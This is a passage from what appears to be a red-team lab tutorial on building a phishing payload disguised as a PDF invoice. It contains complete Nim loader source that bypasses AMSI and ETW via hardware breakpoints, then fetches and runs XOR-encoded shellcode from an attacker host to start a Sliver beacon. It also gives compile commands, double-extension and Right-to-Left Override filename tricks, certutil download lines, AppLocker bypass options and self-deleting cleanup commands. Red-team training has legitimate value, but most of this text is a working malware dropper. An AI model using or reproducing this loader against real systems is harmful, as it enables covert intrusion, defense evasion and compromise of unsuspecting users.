Generate the icon locally using ImageMagick, which ships with Kali. This avoids relying on any external download:

```bash
# Create a 256x256 red rectangle with white PDF text
# This is a functional placeholder icon that will show as a colored file icon
convert -size 256x256 xc:#CC0000 \
  -fill white -font DejaVu-Sans-Bold -pointsize 72 \
  -gravity center -annotate 0 'PDF' \
  /tmp/pdf_icon_256.png

# Convert to .ico format (ICO requires specific sizes)
convert /tmp/pdf_icon_256.png \
  -define icon:auto-resize=256,128,64,48,32,16 \
  /tmp/pdf_icon.ico

# Verify it is a real ICO file
file /tmp/pdf_icon.ico
# Expected: /tmp/pdf_icon.ico: MS Windows icon resource
```

If `file` does not say `MS Windows icon resource`, the conversion failed. Check that ImageMagick is installed:

```bash
convert --version
# If not installed: sudo apt install imagemagick
```

For a more authentic icon, extract the actual PDF icon from the victim Windows machine and transfer it to Kali. Look in `C:\Windows\System32\shell32.dll` or the Adobe Reader installation directory. Use Resource Hacker on Windows to extract the `.ico` file.

Compile the resource file once the `.ico` is verified:

```bash
cd /tmp
x86_64-w64-mingw32-windres pdf_icon.rc -O coff -o pdf_icon.res
```

This creates `pdf_icon.res` which you will link into your Nim binary during compilation.

### 6.7 Write the Masqueraded Loader

```bash
nano /tmp/fakepdf_loader.nim
```

```nim
import winim/lean
import winim/shell
import winim/winstr
import os
import httpclient
import strutils

# ============================================================
# CONFIGURATION
# ============================================================
const KALI_IP   = "192.168.10.10"
const KALI_PORT = "8888"
const SC_PATH   = "/beacon_encoded.bin"
const XOR_KEY   = 0xAB.byte

# ============================================================
# EMBEDDED DECOY PDF
# This is the real PDF that opens on screen to fool the user.
# Paste the output of pdf_to_nim.py here.
# For the lab, you can also fetch it from Kali at runtime
# instead of embedding it (smaller binary).
# ============================================================

# Option A: Fetch decoy from Kali at runtime (simpler for the lab)
# Option B: Embed decoy bytes directly (for real engagements - no network
#           fetch needed for the decoy, reduces suspicion)
#
# We will use Option A for the lab:
const DECOY_URL = "http://" & KALI_IP & ":" & KALI_PORT & "/decoy_invoice.pdf"

# ============================================================
# HARDWARE BREAKPOINT BYPASS (same as Methods 1 and 2)
# No memory patching. CPU debug registers intercept
# AmsiScanBuffer and EtwEventWrite without modifying code.
# ============================================================
var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

# ============================================================
# DECOY: Drop and open the real PDF
# This is the first thing that happens so the user sees
# the document immediately and does not get suspicious.
# ============================================================
proc openDecoyPdf() =
  let tempDir = getEnv("TEMP")
  let pdfPath = tempDir & "\\Invoice_June2026.pdf"

  var client = newHttpClient()
  try:
    let pdfData = client.getContent(DECOY_URL)
    writeFile(pdfPath, pdfData)
  except:
    return

  discard ShellExecuteA(
    0, "open", pdfPath, nil, nil, SW_SHOWNORMAL
  )

# ============================================================
# SHELLCODE RUNNER (callback execution, same as Methods 1/2)
# ============================================================
proc runShellcode() =
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return

  if encoded.len == 0:
    return

  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY

  let scLen = shellcode.len.SIZE_T

  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return

  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)

  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)

  # Execute via callback, not CreateThread
  discard EnumSystemLocalesA(
    cast[LOCALE_ENUMPROCA](mem),
    LCID_INSTALLED
  )

# ============================================================
# ENTRY POINT
# The order matters:
# 1. Open decoy PDF FIRST (user sees a document immediately)
# 2. Install HWBP on AMSI/ETW (no memory patching)
# 3. Run shellcode via callback (beacon fires while user
#    reads the PDF)
# ============================================================
when isMainModule:
  # Step 1: Open decoy PDF immediately
  openDecoyPdf()

  # Delay so the PDF reader steals focus
  sleep(1000)

  # Step 2: Install hardware breakpoints
  setHardwareBreakpoints()

  # Step 3: Run the shellcode via callback
  runShellcode()
```

### 6.8 Compile With the PDF Icon

The binary must be compiled as a GUI application to suppress the console window. It must also link the icon resource file so Windows Explorer displays the PDF icon.

```bash
nim c \
  -d:mingw \
  -d:release \
  --opt:size \
  --app:gui \
  --passL:-s \
  --cpu:amd64 \
  --passL:/tmp/pdf_icon.res \
  -o:"/tmp/Invoice_June2026.pdf.exe" \
  /tmp/fakepdf_loader.nim
```

Key differences from Method 1:

| Flag | Purpose |
|------|-----|
| `--app:gui` | Compiles as a GUI application. No console window appears when the target executes it. A flashing CMD window is an immediate OPSEC failure. |
| `--passL:/tmp/pdf_icon.res` | Links the icon resource into the PE. Explorer uses this icon when displaying the file. |
| `-o:Invoice_June2026.pdf.exe` | The double extension. Combined with Windows' default extension-hiding behavior, Explorer displays this as `Invoice_June2026.pdf`. |

Verify the output:

```bash
ls -la "/tmp/Invoice_June2026.pdf.exe"
file "/tmp/Invoice_June2026.pdf.exe"
```

### 6.9 The Filename Masquerading Techniques

**Double extension with extension hiding:**

Windows hides known file extensions by default ("Hide extensions for known file types" is enabled out of the box). With this setting:
- `Invoice_June2026.pdf.exe` is displayed as `Invoice_June2026.pdf` with whatever icon is embedded in the binary.

Combined with a PDF icon resource, the file is visually identical to a real PDF. This works against the vast majority of corporate users.

**Right-to-Left Override (RLO) Unicode trick:**

If the target machine has extension display enabled (some technical users configure this), the double extension becomes visible. The RLO technique handles this case.

The Unicode character U+202E (Right-to-Left Override) reverses the display direction of all text that follows it. Inserting RLO before `fdp.exe` causes those characters to display as `exe.pdf`. The OS still treats the file as an `.exe`. The MITRE ATT&CK technique reference is T1036.002 (Masquerading: Right-to-Left Override).

```
Invoice_June2026[U+202E]fdp.exe
```

Displays in Explorer as:

```
Invoice_June2026exe.pdf
```

But the filesystem sees it as an `.exe` and executes it accordingly. To apply the rename on Linux:

```bash
# Rename using printf with the Unicode escape
mv "/tmp/Invoice_June2026.pdf.exe" "$(printf '/tmp/Invoice_June2026\xe2\x80\xaefdp.exe')"
```

After the rename, verify the file still exists (the original name is gone, use a wildcard):

```bash
ls -la /tmp/Invoice_June2026*
file /tmp/Invoice_June2026*
```

You will see the renamed file. The `file` command will still confirm it is a `PE32+ executable`.

For the lab, the `.pdf.exe` double extension is sufficient because Windows hides extensions by default. If you did the RLO rename, the file is served under its new name from the HTTP server. Update the download URL on the target machine accordingly.

### 6.10 Deliver to the Target

```bash
# Check which filename is in /tmp (depends on whether you did the RLO rename)
ls -la /tmp/Invoice_June2026*
ls /tmp/decoy_invoice.pdf
```

Both files are already in `/tmp/` which is being served on port 8888. Note the exact filename shown by `ls` — that is the name you use in the download URL on the victim.

On the victim, as `CORP\vamsi`, download the fake PDF to the Downloads folder (or Desktop, wherever is realistic):

```powershell
# Using Invoke-WebRequest to simulate a browser download
Invoke-WebRequest -Uri "http://192.168.10.10:8888/Invoice_June2026.pdf.exe" -OutFile "$env:USERPROFILE\Desktop\Invoice_June2026.pdf.exe"
```

Or use certutil to put it in a trusted AppLocker path:

```cmd
certutil.exe -urlcache -split -f http://192.168.10.10:8888/Invoice_June2026.pdf.exe C:\Windows\Temp\Invoice_June2026.pdf.exe
```

### 6.11 AppLocker Bypass Considerations for Method 3

AppLocker blocks the executable if it is not in a trusted path. `Downloads`, `Desktop`, and user profile directories are not in the default allow list.

**Option A:** Place the payload in `C:\Windows\Temp\` and execute from there. This bypasses AppLocker but breaks the phishing pretext realism since no legitimate user downloads an invoice to a system temp directory.

**Option B:** Combine Method 3's social engineering pretext with Method 2's DLL sideloading delivery. Package `Bginfo64.exe` and `version.dll` inside a ZIP archive with a convincing name. The phishing lure instructs the target to extract and run the contained setup binary. AppLocker's default DLL rules do not apply. The payload executes inside `Bginfo64.exe`.

**Option C:** Many real-world environments enforce Defender but not AppLocker. In those environments, the payload runs from `Downloads` or `Desktop` without restriction. For this lab where AppLocker is enforced, use Option A.

For the lab:

```cmd
:: Run from the trusted path
C:\Windows\Temp\Invoice_June2026.pdf.exe
```

### 6.12 Execution Sequence on the Target

1. No console window appears. The binary is compiled as a GUI application.
2. Within one second, `ShellExecute` opens the decoy PDF in the default PDF reader. The target sees a document.
3. After a 1-second delay, hardware breakpoints are set on `AmsiScanBuffer` and `EtwEventWrite` via CPU debug registers.
4. The encoded shellcode is fetched from Kali over HTTP, XOR-decoded in memory, written to a `PAGE_READWRITE` region, permission-flipped to `PAGE_EXECUTE_READ`, and executed via `EnumSystemLocalesA` callback.
5. The Sliver beacon makes its first check-in on port 443.

Check Sliver:

```
sliver > beacons
```

A new beacon appears as `CORP\vamsi`. Open it and queue a command:

```
sliver > use <beacon-id>
sliver (BEACON_NAME) > ps
```

Wait for the next check-in. In the process list you will see `Invoice_June2026.pdf.exe`. That is the process the beacon is running inside.

### 6.13 OPSEC Assessment for Method 3

Artifacts after execution:
- The payload binary on disk (wherever the target saved it).
- The decoy PDF in `%TEMP%`.
- Prefetch entry for the payload EXE.
- Network flow logs: two HTTP connections to `192.168.10.10:8888` (fetching decoy and shellcode), then periodic HTTPS check-ins to port 443.
- Sysmon Event ID 1 (Process Create): the PDF reader process was launched with the payload EXE as its parent, not Explorer. This parent-child relationship is anomalous and is a reliable detection signal for defenders running Sysmon.

The parent-child process anomaly is the most significant OPSEC risk. In a real engagement, you would schedule the self-deletion of the payload using a `cmd /c ping -n 3 127.0.0.1 & del` command launched as a detached process after execution, removing the binary before the incident response team can retrieve it.

To clean up after the beacon is stable:

```
sliver (BEACON_NAME) > rm C:\Windows\Temp\Invoice_June2026.pdf.exe
sliver (BEACON_NAME) > execute -o cmd.exe /c del "%TEMP%\Invoice_June2026.pdf"
```

---

## Summary

All three methods produce the same end state: a live Sliver beacon running as `CORP\vamsi` on `WORKSTATION01`, past Defender and AppLocker. The difference is the approach and the resulting detection risk.

| Method | Technique | MITRE ATT&CK | Detection Risk |
|--------|-----------|--------------|----------------|
| Method 1: Standalone EXE | Custom loader in AppLocker-trusted path | T1059, T1027 | Medium - unknown binary making network connections |
| Method 2: DLL Sideloading | Malicious DLL loaded by signed Microsoft binary | T1574.002 | Lower - implant runs inside trusted process, no DLL rules |
| Method 3: Masqueraded EXE | Payload disguised as document, opens real decoy | T1036.002, T1204.002 | Context-dependent - effective against non-technical users, anomalous parent-child process relationship |

**Method 1** is the fastest path to a beacon. Use it in lab environments or targets with minimal monitoring.

**Method 2** is operationally stronger. The implant runs inside a signed Microsoft process, AppLocker is not a factor, and ETW telemetry is suppressed. Use this when EDR is present.

**Method 3** is the phishing delivery vector. It is a social engineering technique, not a technical bypass. Its effectiveness depends on the target's vigilance and the quality of the phishing pretext. Combine with Method 2's delivery mechanism when AppLocker enforcement is strict.

The beacon you have established is the foundation for all subsequent modules.

---

Open `03-situational-awareness.md` next.


